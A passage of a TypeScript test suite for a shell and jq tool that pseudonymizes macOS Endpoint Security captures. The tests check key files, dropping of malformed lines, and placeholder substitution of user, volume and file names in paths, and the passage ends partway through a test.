import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterAll, describe, expect, test } from 'vitest';
import { buildModel } from '../src/model/builder';
import { RECON_TOOLS, SHELLS } from '../src/rules/rules';
import { esBtm, esClone, esCreate, esExec, esExit, esFork, esLink, esProc } from './clean-fixture';
import { fixture } from './fixtures';
import { findingSignature } from './helpers';

// scripts/gameleira-clean.sh pseudonymizes a capture. Run with /bin/bash so macOS's bash 3.2 is what gets tested there.
const SCRIPT = path.resolve(__dirname, '..', 'scripts', 'gameleira-clean.sh');
const JQ = '/usr/bin/jq';
const SYNTHETIC = fixture('synthetic-lab.jsonl');

const tmpDirs: string[] = [];
function tmpDir(): string {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'clean-'));
  tmpDirs.push(d);
  return d;
}
afterAll(() => { for (const d of tmpDirs) fs.rmSync(d, { recursive: true, force: true }); });

export interface KeyRow { kind: string; placeholder: string; real: string }

/** The key file: a header line, then `kind<TAB>placeholder<TAB>real as a JSON string` per line. */
export function parseKey(tsv: string): KeyRow[] {
  const lines = tsv.split('\n').filter(l => l !== '');
  expect(lines[0]).toBe('kind\tplaceholder\treal');
  return lines.slice(1).map(l => {
    const [kind, placeholder, real] = l.split('\t');
    return { kind: kind!, placeholder: placeholder!, real: JSON.parse(real!) as string };
  });
}

export interface CleanRun {
  /** The cleaned capture: standard output with `-o -`, else the output file (empty when none was written). */
  out: string;
  /** The key file's content, empty when none was made. */
  key: string;
  /** The summary on stderr, `name: value` lines. */
  summary: Record<string, string>;
  stderr: string;
  status: number;
}

/**
 * Runs the script in a fresh folder, with its own key folder unless `-k` is passed, and this Mac's accounts left out.
 * Without `-o` the capture goes to `out.jsonl` in that folder. `input` is written to a file and passed as `-i`, or
 * with `-i -` given on standard input.
 */
export function runClean(args: string[], opts: { input?: string; env?: Record<string, string>; uncleaned?: number } = {}): CleanRun {
  const dir = tmpDir();
  const argv = [...args];
  const fromStdin = argv[argv.indexOf('-i') + 1] === '-' && argv.includes('-i');
  if (opts.input !== undefined && !fromStdin) {
    fs.writeFileSync(path.join(dir, 'input'), opts.input);
    if (!argv.includes('-i')) argv.push('-i', path.join(dir, 'input'));
  }
  if (argv[0] === 'clean' && !argv.includes('-o')) argv.push('-o', path.join(dir, 'out.jsonl'));
  const keyDir = path.join(dir, 'keys');
  const r = spawnSync('/bin/bash', [SCRIPT, ...argv], {
    cwd: dir, maxBuffer: 64 << 20, input: fromStdin ? opts.input ?? '' : '',
    env: { ...process.env, GAMELEIRA_CLEAN_KEY_DIR: keyDir, GAMELEIRA_CLEAN_NO_LOCAL_SEEDS: '1', ...opts.env },
  });
  const stderr = r.stderr.toString('utf8');
  const summary: Record<string, string> = {};
  for (const l of stderr.split('\n')) {
    const i = l.indexOf(': ');
    if (i > 0) summary[l.slice(0, i)] = l.slice(i + 2);
  }
  const oi = argv.indexOf('-o');
  const outFile = oi >= 0 && argv[oi + 1] !== '-' ? argv[oi + 1]! : null;
  const out = outFile === null ? r.stdout.toString('utf8') : fs.existsSync(outFile) ? fs.readFileSync(outFile, 'utf8') : '';
  const keyFile = summary['key'];
  const key = keyFile && fs.existsSync(keyFile) ? fs.readFileSync(keyFile, 'utf8') : '';
  // An event the cleaner could not clean is dropped: a bug in the program would thin the capture without a word.
  if (argv[0] === 'clean' && r.status === 0) expect(summary['events the cleaner could not clean'], stderr).toBe(String(opts.uncleaned ?? 0));
  return { out, key, summary, stderr, status: r.status ?? -1 };
}

const synthLines = (): string[] => fs.readFileSync(SYNTHETIC, 'utf8').split('\n').filter(l => l !== '');
const lines = (s: string): string[] => s.split('\n').filter(l => l !== '');

describe.skipIf(!fs.existsSync(JQ))('plumbing', () => {
  test('an unknown argument exits 2', () => {
    expect(runClean(['clean', '--nope']).status).toBe(2);
    expect(runClean(['clean', '-i', SYNTHETIC, '--nope']).status).toBe(2);
    expect(runClean(['frobnicate']).status).toBe(2);
    const noValue = runClean(['clean', '-o', '-', '-i']);
    expect(noValue.status).toBe(2);
    expect(noValue.stderr).toMatch(/-i needs a value/);
  });

  test('clean without -i exits 2', () => {
    const r = runClean(['clean']);
    expect(r.status).toBe(2);
    expect(r.stderr).toMatch(/-i/);
  });

  test('record is accepted and says it is not built yet', () => {
    const r = runClean(['record', '-t', '5']);
    expect(r.status).toBe(1);
    expect(r.stderr).toMatch(/record mode is not built yet/);
    expect(runClean(['record', '--nope']).status).toBe(2);
  });

  test('every event comes out as JSON, one per line', () => {
    const r = runClean(['clean', '-i', SYNTHETIC, '-o', '-']);
    expect(r.status).toBe(0);
    const out = lines(r.out);
    expect(out).toHaveLength(synthLines().length);
    for (const l of out) expect(() => JSON.parse(l)).not.toThrow();
    expect(r.summary['events in']).toBe(String(out.length));
    expect(r.summary['events out']).toBe(String(out.length));
    expect(r.summary['unreadable lines dropped']).toBe('0');
    expect(r.summary['events dropped by Endpoint Security']).toBe('0');
    expect(r.summary['placeholders user']).toBe('1');   // alice
    expect(r.summary['redacted']).toBe('0');
    expect(r.summary['capture']).toBe('(standard output)');
  });

  test('a broken line is dropped and counted, never copied', () => {
    const good = synthLines();
    const input = [
      good[0], good[1], good[2],
      '{"event":{"exec":{"args":["SECRETFRAG',
      'not json SECRETFRAG2',
      good[3],
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status).toBe(0);
    expect(lines(r.out)).toHaveLength(4);
    expect(r.summary['unreadable lines dropped']).toBe('2');
    expect(r.out).not.toContain('SECRETFRAG');
    expect(r.stderr).not.toContain('SECRETFRAG');
  });

  test('a line that is JSON but not an event object is dropped too, and blank lines are skipped', () => {
    const good = synthLines();
    const r = runClean(['clean', '-o', '-'], { input: [good[0], '', '42', '"SECRETFRAG"', 'null', '[1,2]', '   ', good[1]].join('\n') + '\n' });
    expect(lines(r.out)).toHaveLength(2);
    expect(r.summary['unreadable lines dropped']).toBe('4');
    expect(r.out).not.toContain('SECRETFRAG');
  });

  test('an event the cleaner cannot clean is dropped and counted apart from unreadable lines, never copied', () => {
    const good = synthLines();
    const r = runClean(['clean', '-o', '-'], { input: [good[0], '{"event":"SECRETFRAG3"}', 'not json', good[1]].join('\n') + '\n', uncleaned: 1 });
    expect(r.status, r.stderr).toBe(0);
    expect(lines(r.out)).toHaveLength(2);
    expect(r.summary['events in']).toBe('4');
    expect(r.summary['unreadable lines dropped']).toBe('1');
    expect(r.summary['events the cleaner could not clean']).toBe('1');
    for (const t of [r.out, r.stderr, r.key]) expect(t).not.toContain('SECRETFRAG3');
  });

  test('a pretty-printed export and a JSON array are read', () => {
    const events = synthLines().slice(0, 12).map(l => JSON.parse(l) as unknown);
    const jsonl = runClean(['clean', '-o', '-'], { input: events.map(e => JSON.stringify(e)).join('\n') + '\n' });
    const objects = runClean(['clean', '-o', '-'], { input: events.map(e => JSON.stringify(e, null, 2)).join('\n') + '\n' });
    const array = runClean(['clean', '-o', '-'], { input: JSON.stringify(events, null, 2) + '\n' });
    expect(lines(jsonl.out)).toHaveLength(12);
    expect(objects.out).toBe(jsonl.out);
    expect(array.out).toBe(jsonl.out);
    expect(objects.summary['input ended with a parse error']).toBeUndefined();
  });

  test('an export cut short says it ended with a parse error, and keeps what was read before', () => {
    const events = synthLines().slice(0, 5).map(l => JSON.parse(l) as unknown);
    const input = events.map(e => JSON.stringify(e, null, 2)).join('\n') + '\n{\n  "event": {"exec": {"args": ["SECRETFRAG';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status).toBe(0);
    expect(lines(r.out)).toHaveLength(5);
    expect(r.summary['input ended with a parse error']).toBe('yes');
    expect(r.stderr).not.toContain('SECRETFRAG');
  });

  test('sequence gaps are reported', () => {
    const p = esProc({ pid: 100, path: '/bin/zsh', platform: true });
    const c = esProc({ pid: 101, path: '/bin/zsh', platform: true, ppid: 100 });
    const input = [esFork(p, c, 1), esExit(c, 2), esExit(p, 5), esFork(p, c, 6)].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(lines(r.out)).toHaveLength(4);
    expect(r.summary['events dropped by Endpoint Security']).toBe('2');
  });

  test('a capture that arrives out of order or starts late has no gaps to report', () => {
    const p = esProc({ pid: 100, path: '/bin/zsh', platform: true });
    const input = [esExit(p, 40), esExit(p, 41), esExit(p, 39), esExit(p, 42)].join('\n') + '\n';
    expect(runClean(['clean', '-o', '-'], { input }).summary['events dropped by Endpoint Security']).toBe('0');
  });

  test('the key is 0600, in the key folder, with a header', () => {
    const dir = tmpDir();
    const keyDir = path.join(dir, 'k');
    const out = path.join(dir, 'x.cleaned.jsonl');
    const r = runClean(['clean', '-i', SYNTHETIC, '-o', out], { env: { GAMELEIRA_CLEAN_KEY_DIR: keyDir } });
    expect(r.status).toBe(0);
    const keyFile = path.join(keyDir, 'x.cleaned.jsonl.key.tsv');
    expect(r.summary['key']).toBe(keyFile);
    expect(fs.statSync(keyFile).mode & 0o777).toBe(0o600);
    expect(fs.readFileSync(keyFile, 'utf8').split('\n')[0]).toBe('kind\tplaceholder\treal');
    expect(parseKey(r.key)[0]).toEqual({ kind: 'user', placeholder: 'user1', real: 'alice' });
    expect(r.summary['capture']).toBe(out);
    expect(r.summary['raw capture, left as it was']).toBe(SYNTHETIC);
  });

  test('-o into a folder that does not exist creates it', () => {
    const dir = tmpDir();
    const out = path.join(dir, 'a', 'b', 'c.jsonl');
    const r = runClean(['clean', '-i', SYNTHETIC, '-o', out]);
    expect(r.status).toBe(0);
    expect(lines(fs.readFileSync(out, 'utf8'))).toHaveLength(synthLines().length);
  });

  test('with -o -, the default key is stdout.key.tsv, and it is not overwritten by a second run', () => {
    const dir = tmpDir();
    const keyDir = path.join(dir, 'keys');
    const first = runClean(['clean', '-i', SYNTHETIC, '-o', '-'], { env: { GAMELEIRA_CLEAN_KEY_DIR: keyDir } });
    expect(first.status).toBe(0);
    expect(first.summary['key']).toBe(path.join(keyDir, 'stdout.key.tsv'));
    const second = runClean(['clean', '-i', SYNTHETIC, '-o', '-'], { env: { GAMELEIRA_CLEAN_KEY_DIR: keyDir } });
    expect(second.status).toBe(1);
    expect(second.stderr).toMatch(/already exists/);
    expect(second.stderr).toMatch(/-k/);
    expect(second.out).toBe('');
  });

  test('an existing default key is refused without -k, and the earlier capture is left alone', () => {
    const dir = tmpDir();
    const keyDir = path.join(dir, 'keys');
    const out = path.join(dir, 'cap.jsonl');
    expect(runClean(['clean', '-i', SYNTHETIC, '-o', out], { env: { GAMELEIRA_CLEAN_KEY_DIR: keyDir } }).status).toBe(0);
    const before = fs.readFileSync(out, 'utf8');
    const again = runClean(['clean', '-i', SYNTHETIC, '-o', out], { env: { GAMELEIRA_CLEAN_KEY_DIR: keyDir } });
    expect(again.status).toBe(1);
    expect(again.stderr).toMatch(/pass -k to reuse it/);
    expect(again.stderr).toMatch(/another -o/);
    expect(fs.readFileSync(out, 'utf8')).toBe(before);
  });

  test('-k names where the key goes; an existing key is loaded and appended to, not replaced', () => {
    const dir = tmpDir();
    const key = path.join(dir, 'mine', 'my.key.tsv');
    const p = esProc({ pid: 100, path: '/bin/zsh', platform: true });
    const c = esProc({ pid: 101, path: '/bin/zsh', platform: true, ppid: 100 });
    const quiet = [esFork(p, c, 1), esExit(c, 2)].join('\n') + '\n';   // nothing in it to clean
    const first = runClean(['clean', '-o', '-', '-k', key], { input: quiet });
    expect(first.status).toBe(0);
    expect(first.summary['key']).toBe(key);
    expect(fs.statSync(key).mode & 0o777).toBe(0o600);
    fs.appendFileSync(key, 'user\tuser1\t"alice"\n');
    fs.chmodSync(key, 0o644);
    const second = runClean(['clean', '-o', '-', '-k', key], { input: quiet + esCreate(p, { path: '/Users/alice/x' }, 3) + '\n' });
    expect(second.status).toBe(0);
    expect(second.key).toBe('kind\tplaceholder\treal\nuser\tuser1\t"alice"\nname\tname1\t"x"\n');
    expect(fs.statSync(key).mode & 0o777).toBe(0o600);
  });

  test('a file that is not a key is refused', () => {
    const dir = tmpDir();
    const key = path.join(dir, 'notakey.tsv');
    fs.writeFileSync(key, 'something else\n');
    const r = runClean(['clean', '-i', SYNTHETIC, '-o', '-', '-k', key]);
    expect(r.status).toBe(1);
    expect(r.stderr).toMatch(/not a Gameleira key file/);
    expect(fs.readFileSync(key, 'utf8')).toBe('something else\n');
  });

  test('a seed file with a bad line, and a key with a bad line, are refused', () => {
    const dir = tmpDir();
    const seeds = path.join(dir, 'seeds.tsv');
    fs.writeFileSync(seeds, 'user\talice\nnonsense\n');
    const r = runClean(['clean', '-i', SYNTHETIC, '-o', '-', '-S', seeds]);
    expect(r.status).toBe(1);
    expect(r.stderr).toMatch(/line 2 of the seed file/);
    const key = path.join(dir, 'bad.key.tsv');
    fs.writeFileSync(key, 'kind\tplaceholder\treal\nuser\tuser1\talice\n');
    const k = runClean(['clean', '-i', SYNTHETIC, '-o', '-', '-k', key]);
    expect(k.status).toBe(1);
    expect(k.stderr).toMatch(/line 2 of the key file/);
  });

  test('a run that fails before it starts leaves no key behind, so the same command works once fixed', () => {
    const dir = tmpDir();
    const keyDir = path.join(dir, 'keys');
    const out = path.join(dir, 'cap.jsonl');
    const seeds = path.join(dir, 'seeds.tsv');
    const env = { GAMELEIRA_CLEAN_KEY_DIR: keyDir };
    fs.writeFileSync(seeds, 'nonsense\n');
    const bad = runClean(['clean', '-i', SYNTHETIC, '-o', out, '-S', seeds], { env });
    expect(bad.status).toBe(1);
    expect(fs.existsSync(path.join(keyDir, 'cap.jsonl.key.tsv'))).toBe(false);
    fs.writeFileSync(seeds, 'user\talice\n');
    expect(runClean(['clean', '-i', SYNTHETIC, '-o', out, '-S', seeds], { env }).status).toBe(0);
  });

  test('numbers pass through unchanged, big ones and ones with a decimal point', () => {
    const e = JSON.parse(synthLines()[0]!) as Record<string, unknown>;
    const raw = JSON.stringify(e).slice(0, -1) + ',"big":18446744073709551615,"dec":1.0,"exp":1e3}';
    const r = runClean(['clean', '-o', '-'], { input: raw + '\n' });
    expect(r.out).toContain('"big":18446744073709551615');
    expect(r.out).toContain('"dec":1.0');
  });

  test('a good seed file and -D domains are accepted', () => {
    const dir = tmpDir();
    const seeds = path.join(dir, 'seeds.tsv');
    fs.writeFileSync(seeds, 'user\talice\nhost\tbox.corp.example\n');
    const r = runClean(['clean', '-i', SYNTHETIC, '-o', '-', '-S', seeds, '-D', 'Corp.Example', '-D', 'other.example']);
    expect(r.status).toBe(0);
  });

  test('-o cannot be the capture being read', () => {
    const dir = tmpDir();
    const raw = path.join(dir, 'raw.jsonl');
    fs.copyFileSync(SYNTHETIC, raw);
    const r = runClean(['clean', '-i', raw, '-o', raw]);
    expect(r.status).toBe(1);
    expect(fs.readFileSync(raw, 'utf8')).toBe(fs.readFileSync(SYNTHETIC, 'utf8'));
  });

  test('findingSignature of raw and cleaned synthetic-lab captures match', () => {
    const r = runClean(['clean', '-i', SYNTHETIC, '-o', '-']);
    const raw = findingSignature(buildModel(synthLines()));
    const cleaned = findingSignature(buildModel(lines(r.out)));
    expect(raw.size).toBeGreaterThan(5);
    expect(cleaned).toEqual(raw);
  });

  test('the fixture builders make a capture the viewer reads', () => {
    const sh = esProc({ pid: 200, path: '/bin/zsh', platform: true, signingId: 'com.apple.zsh' });
    const ls = esProc({ pid: 200, pidversion: 1201, path: '/bin/ls', platform: true, signingId: 'com.apple.ls' });
    const m = buildModel([
      esExec(sh, ls, { args: ['ls', '-l'], cwd: '/tmp', seq: 1 }),
      esCreate(ls, { dir: '/tmp', filename: 'a.txt' }, 2),
      esCreate(ls, { path: '/tmp/b.txt' }, 3),
    ]);
    expect(m.stats.badLines).toBe(0);
    expect(m.stats.events).toBe(3);
  });
});

describe.skipIf(!fs.existsSync(JQ))('the stream between jq and the files', () => {
  // A stand-in for jq that says what the real program says on stderr, so the plumbing is tested on its own.
  test('with a stand-in jq: K lines go to the key file, the S line to the stats file, anything else to stderr, and stdout is only the capture', () => {
    const dir = tmpDir();
    const fakeJq = path.join(dir, 'fake-jq');
    fs.writeFileSync(fakeJq, [
      '#!/bin/bash',
      'while IFS= read -r l; do',
      '  printf "K\\tname\\tname1\\t%s\\n" "\\"real $l\\"" >&2',
      '  echo "a diagnostic about $l" >&2',
      '  echo "{\\"cleaned\\":\\"$l\\"}"',
      'done',
      'printf \'S\\t{"eventsIn":2}\\n\' >&2',
    ].join('\n'), { mode: 0o755 });
    const key = path.join(dir, 'key');
    const stats = path.join(dir, 'stats');
    fs.writeFileSync(key, 'kind\tplaceholder\treal\n');
    const r = spawnSync('/bin/bash', ['-c', `GAMELEIRA_CLEAN_SOURCE_ONLY=1 . "${SCRIPT}"; run_cleaner "${dir}/cfg" "${key}" "${stats}"; echo "status $?" >&2`], {
      input: 'one\ntwo\n', env: { ...process.env, GAMELEIRA_CLEAN_JQ: fakeJq },
    });
    expect(r.stdout.toString()).toBe('{"cleaned":"one"}\n{"cleaned":"two"}\n');
    expect(fs.readFileSync(key, 'utf8')).toBe('kind\tplaceholder\treal\nname\tname1\t"real one"\nname\tname1\t"real two"\n');
    expect(fs.readFileSync(stats, 'utf8')).toBe('{"eventsIn":2}\n');
    const err = r.stderr.toString();
    expect(err).toContain('a diagnostic about one');
    expect(err).not.toMatch(/^K\t/m);
    expect(err).toContain('status 0');
  });

  // The real program, with only the cleaning swapped for a minting stand-in: the call in `step` is renamed, so the real
  // state, numbering, K lines and S line run under the real jq, whatever clean_event grows into.
  test('the real program writes a K line per placeholder, numbers on from a loaded key, and ends with the stats', () => {
    const dir = tmpDir();
    const program = fs.readFileSync(path.resolve(__dirname, '..', 'scripts', 'gameleira-clean.jq'), 'utf8');
    expect(program).toContain('clean_event($seen)');
    const mint = [
      'def mint_event($state):',
      '  .who as $w',
      '  | if $state.map.user[$w] != null then {event: (.who = $state.map.user[$w]), state: $state, new: []}',
      '    else ($state.next.user // 1) as $n | "user\\($n)" as $p',
      '      | {event: (.who = $p), state: ($state | .map.user[$w] = $p | .next.user = $n + 1), new: [{kind: "user", placeholder: $p, real: $w}]}',
      '    end;',
    ].join('\n');
    const scratch = path.join(dir, 'mint.jq');
    fs.writeFileSync(scratch, mint + '\n' + program.replace('clean_event($seen)', 'mint_event($seen)'));
    const loadedKey = path.join(dir, 'loaded.key.tsv');
    fs.writeFileSync(loadedKey, 'kind\tplaceholder\treal\nuser\tuser4\t"known"\n');
    const key = path.join(dir, 'run.key.tsv');
    fs.writeFileSync(key, 'kind\tplaceholder\treal\n');
    const stats = path.join(dir, 'stats');
    const nasty = 'a\tb\n"c"\\d';
    const input = [nasty, 'known', nasty, 'fresh'].map(w => JSON.stringify({ who: w, global_seq_num: 1 })).join('\n') + '\n'
      + 'not json\n' + JSON.stringify({ who: 'late', global_seq_num: 4 }) + '\n';
    const r = spawnSync('/bin/bash', ['-c', [
      `GAMELEIRA_CLEAN_SOURCE_ONLY=1 . "${SCRIPT}"`,
      `CLEAN_PROGRAM="${scratch}"; DOMAINS=(); SEED_FILE=; LOADED_KEY="${loadedKey}"`,
      `write_config "${dir}/cfg.json" && run_cleaner "${dir}/cfg.json" "${key}" "${stats}"`,
    ].join('\n')], { input, env: process.env });
    expect(r.status, r.stderr.toString()).toBe(0);
    // `known` keeps its loaded placeholder; new values continue at user5, and a repeat reuses its placeholder.
    expect(lines(r.stdout.toString()).map(l => (JSON.parse(l) as { who: string }).who))
      .toEqual(['user5', 'user4', 'user5', 'user6', 'user7']);
    expect(parseKey(fs.readFileSync(key, 'utf8'))).toEqual([
      { kind: 'user', placeholder: 'user5', real: nasty },
      { kind: 'user', placeholder: 'user6', real: 'fresh' },
      { kind: 'user', placeholder: 'user7', real: 'late' },
    ]);
    // Each real value is one JSON string on one line, so tabs, newlines and quotes survive.
    expect(fs.readFileSync(key, 'utf8').split('\n')[1]).toBe(`user\tuser5\t${JSON.stringify(nasty)}`);
    expect(JSON.parse(fs.readFileSync(stats, 'utf8'))).toEqual({
      eventsIn: 6, eventsOut: 5, unreadable: 1, uncleaned: 0, seqGaps: 2, redacted: 0, placeholders: { user: 3 },
    });
    expect(r.stderr.toString()).not.toMatch(/^[KS]\t/m);
  });

  test('write_config turns -D, -S and a loaded key into the config the program reads', () => {
    const dir = tmpDir();
    const seeds = path.join(dir, 'seeds.tsv');
    const key = path.join(dir, 'in.key.tsv');
    fs.writeFileSync(seeds, 'user\talice\nhost\tbox.corp.example\n');
    fs.writeFileSync(key, 'kind\tplaceholder\treal\nname\tname7\t"a\\tb\\nc"\nrealname\tPerson 2\t"Alice A"\n');
    const cfg = path.join(dir, 'cfg.json');
    const r = spawnSync('/bin/bash', ['-c',
      `GAMELEIRA_CLEAN_SOURCE_ONLY=1 . "${SCRIPT}"; DOMAINS=(Corp.Example .other.example); SEED_FILE="${seeds}"; LOADED_KEY="${key}"; write_config "${cfg}"`]);
    expect(r.status, r.stderr.toString()).toBe(0);
    expect(JSON.parse(fs.readFileSync(cfg, 'utf8'))).toEqual({
      seeds: [{ kind: 'user', value: 'alice' }, { kind: 'host', value: 'box.corp.example' }],
      domains: ['corp.example', 'other.example'],
      key: [{ kind: 'name', placeholder: 'name7', real: 'a\tb\nc' }, { kind: 'realname', placeholder: 'Person 2', real: 'Alice A' }],
      keep: [],
    });
  });
});

// ---- paths ------------------------------------------------------------------------------------------------------
// A Mac whose user is jdoe (uid 501). The environment is given explicitly: bare account names outside paths (USER=jdoe)
// are cleaned by a later step, so none is planted here.
const JDOE_ENV = ['HOME=/Users/jdoe', 'LANG=C.UTF-8', 'PATH=/usr/bin:/bin:/Users/jdoe/.pyenv/shims', 'SHELL=/bin/zsh', 'TMPDIR=/var/folders/ab/cdef/T/'];
const zsh = esProc({ pid: 300, path: '/bin/zsh', platform: true, signingId: 'com.apple.zsh' });
const sysProc = (pid: number, p: string): ReturnType<typeof esProc> =>
  esProc({ pid, path: p, platform: true, signingId: `com.apple.${p.split('/').pop()!}`, ppid: 300 });
const userProc = (pid: number, p: string, extra: Partial<Parameters<typeof esProc>[0]> = {}): ReturnType<typeof esProc> =>
  esProc({ pid, path: p, signingId: null, ppid: 300, ...extra });

/** The events of a cleaned capture, parsed. */
const events = (out: string): Record<string, any>[] => lines(out).map(l => JSON.parse(l) as Record<string, any>);
/** The real values of a key of one kind. */
const keyed = (key: string, kind: string): Map<string, string> =>
  new Map(parseKey(key).filter(r => r.kind === kind).map(r => [r.real, r.placeholder]));

describe.skipIf(!fs.existsSync(JQ))('paths', () => {
  const planted = [
    '/Users/jdoe/Documents/Board – Q3 "final"/Q3-acquisition.pdf',
    '/Users/jdoe/Desktop/Merger/notes.txt',
    '/Users/jdoe/Library/Application Support/Microsoft/Office/AutoRecovery/Offer.docx',
    '/Users/jdoe/Library/Group Containers/UBF8T346G9.Office/Budget.xlsx',
    '/Users/Shared/Payroll.xlsx',
    '/Volumes/Jdoe Passport/Clients/acme.pdf',
    '/tmp/Board.key',
    '/var/folders/ab/cdef/T/TemporaryItems/Notes.txt',
    '/System/Volumes/Data/Users/jdoe/Desktop/Merger/notes.txt',
  ];
  const open = sysProc(310, '/usr/bin/open');
  const leakInput = [
    ...planted.map((p, i) => esCreate(zsh, { path: p }, i + 1)),
    esCreate(zsh, { dir: '/Users/jdoe/Documents/Board', filename: 'Minutes.pages' }, 20),
    esExec(zsh, open, { args: ['open', '~/Documents/Offsite.txt', '--out=/Users/jdoe/Desktop/Merger/plan.key',
      '-I/Users/jdoe/Clearance/include', '@/tmp/Kickoff.rsp', 'cc -I/Users/jdoe/Clearance a.c | tee log'], cwd: '/Users/jdoe/Desktop/Merger', env: JDOE_ENV, seq: 21 }),
  ].join('\n') + '\n';

  test('home, shared, volume and temp names become placeholders', () => {
    const r = runClean(['clean', '-o', '-'], { input: leakInput });
    expect(r.status, r.stderr).toBe(0);
    const out = r.out.toLowerCase();
    for (const s of ['jdoe', 'board', 'q3', 'acquisition', 'merger', 'notes.txt', 'offer', 'budget', 'payroll', 'passport',
      'clients', 'acme', 'minutes', 'offsite', 'plan.key', 'clearance', 'kickoff']) expect(out, s).not.toContain(s);
    expect(keyed(r.key, 'user')).toEqual(new Map([['jdoe', 'user1']]));
    expect(keyed(r.key, 'volume')).toEqual(new Map([['Jdoe Passport', 'vol1']]));
    const names = keyed(r.key, 'name');
    for (const n of ['Board – Q3 "final"', 'Q3-acquisition.pdf', 'Merger', 'notes.txt', 'Offer.docx', 'Budget.xlsx', 'Payroll.xlsx',
      'Clients', 'acme.pdf', 'Board.key', 'Notes.txt', 'Board', 'Minutes.pages', 'Offsite.txt', 'plan.key']) expect(names.has(n), n).toBe(true);
    expect(names.get('Q3-acquisition.pdf')).toMatch(/^name\d+\.pdf$/);
    expect(names.get('Board – Q3 "final"')).toMatch(/^name\d+$/);
    const ev = events(r.out);
    const paths = ev.slice(0, planted.length).map(e => e.event.create.destination.existing_file.path as string);
    expect(paths[0]).toBe(`/Users/user1/Documents/${names.get('Board – Q3 "final"')}/${names.get('Q3-acquisition.pdf')}`);
    // The first name below a ~/Library structure folder is the app's (Microsoft); what it keeps below is cleaned.
    expect(paths[2]).toMatch(/^\/Users\/user1\/Library\/Application Support\/Microsoft\/name\d+\/name\d+\/name\d+\.docx$/);
    expect(paths[3]).toMatch(/^\/Users\/user1\/Library\/Group Containers\/UBF8T346G9\.Office\/name\d+\.xlsx$/);
    expect(paths[4]).toMatch(/^\/Users\/Shared\/name\d+\.xlsx$/);
    expect(paths[5]).toMatch(/^\/Volumes\/vol1\/name\d+\/name\d+\.pdf$/);
    expect(paths[6]).toMatch(/^\/tmp\/name\d+\.key$/);
    expect(paths[7]).toMatch(/^\/var\/folders\/ab\/cdef\/T\/TemporaryItems\/name\d+\.txt$/);
    expect(paths[8]).toBe(`/System/Volumes/Data${paths[1]}`);
    // A new file's separate name is cleaned as the last name of its folder.
    const np = ev[planted.length]!.event.create.destination.new_path;
    expect(np.dir.path).toBe(`/Users/user1/Documents/${names.get('Board')}`);
    expect(np.filename).toBe(names.get('Minutes.pages'));
    expect(ev[planted.length]!.event.create).not.toHaveProperty('acl');
    // ~/ paths and paths after = are cleaned too; arguments keep their count and order.
    const exec = ev[planted.length + 1]!.event.exec;
    // A path glued to an option (-I/…, @/…) is found too, when it is in a cleaned place.
    expect(exec.args).toEqual(['open', `~/Documents/${names.get('Offsite.txt')}`, `--out=/Users/user1/Desktop/${names.get('Merger')}/${names.get('plan.key')}`,
      `-I/Users/user1/${names.get('Clearance')}/include`, `@/tmp/${names.get('Kickoff.rsp')}`, `cc -I/Users/user1/${names.get('Clearance')} a.c | tee log`]);
    expect(exec.cwd.path).toBe(`/Users/user1/Desktop/${names.get('Merger')}`);
  });

  test('the same name gets the same placeholder in every field', () => {
    const backup = userProc(320, '/usr/local/bin/backup');
    const btmd = sysProc(330, '/System/Library/PrivateFrameworks/BackgroundTaskManagement.framework/Resources/backgroundtaskmanagementd');
    const input = [
      esCreate(zsh, { path: '/Users/jdoe/Documents/Q3-acquisition.pdf' }, 1),
      esExec(zsh, backup, { args: ['backup', '/tmp/Q3-acquisition.pdf', 'sh', '-c', 'cp "/Users/jdoe/Board Q3/Q3-acquisition.pdf" /tmp/x'], cwd: '/Volumes/Jdoe Passport/Q3-acquisition.pdf', env: JDOE_ENV, seq: 2 }),
      esBtm(btmd, { itemUrl: 'file:///Users/jdoe/Downloads/Q3-acquisition.pdf', executablePath: '/usr/local/bin/backup', itemType: 1 }, 3),
      esCreate(zsh, { path: '/Users/jdoe/Board Q3/notes.txt' }, 4),
      esBtm(btmd, { itemUrl: 'file:///Users/jdoe/Board%20Q3/notes.txt', executablePath: '/usr/local/bin/backup', itemType: 1 }, 5),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const rows = parseKey(r.key).filter(k => k.real === 'Q3-acquisition.pdf');
    expect(rows).toHaveLength(1);
    const ph = rows[0]!.placeholder;
    expect(ph).toMatch(/^name\d+\.pdf$/);
    const board = keyed(r.key, 'name').get('Board Q3')!;
    const ev = events(r.out);
    expect(ev[0]!.event.create.destination.existing_file.path).toBe(`/Users/user1/Documents/${ph}`);
    expect(ev[1]!.event.exec.cwd.path).toBe(`/Volumes/vol1/${ph}`);
    expect(ev[1]!.event.exec.args).toEqual(['backup', `/tmp/${ph}`, 'sh', '-c', `cp "/Users/user1/${board}/${ph}" /tmp/${keyed(r.key, 'name').get('x')}`]);
    expect(ev[2]!.event.btm_launch_item_add.item.item_url).toBe(`file:///Users/user1/Downloads/${ph}`);
    // A file URL is read name by name with its %-escapes undone, so a name in it matches the same name in a path.
    expect(ev[4]!.event.btm_launch_item_add.item.item_url).toBe(`file:///Users/user1/${board}/${keyed(r.key, 'name').get('notes.txt')}`);
    expect(r.out).not.toContain('Q3');
  });

  test('shapes the rules need survive', () => {
    const agent = userProc(340, '/Users/jdoe/Applications/Foo.app/Contents/MacOS/Foo', { teamId: 'ABCDE12345', signingId: 'com.foo.Foo' });
    const translocated = '/private/var/folders/ab/cdef/T/AppTranslocation/0E7A1C2B-5D4F-4A3B-9C8D-112233445566/d/Foo.app/Contents/MacOS/Foo';
    const moved = userProc(341, translocated, { teamId: 'ABCDE12345', signingId: 'com.foo.Foo' });
    const btmd = sysProc(330, '/System/Library/PrivateFrameworks/BackgroundTaskManagement.framework/Resources/backgroundtaskmanagementd');
    const curl = sysProc(342, '/usr/bin/curl');
    const input = [
      esCreate(zsh, { path: '/Users/jdoe/Downloads/setup.pkg' }, 1),
      esCreate(zsh, { path: '/Users/Shared/drop.txt' }, 2),
      esCreate(zsh, { path: '/Users/jdoe/Projects/.hidden/x' }, 3),
      esCreate(zsh, { path: '/Users/jdoe/Projects/node_modules/.bin/tool' }, 4),
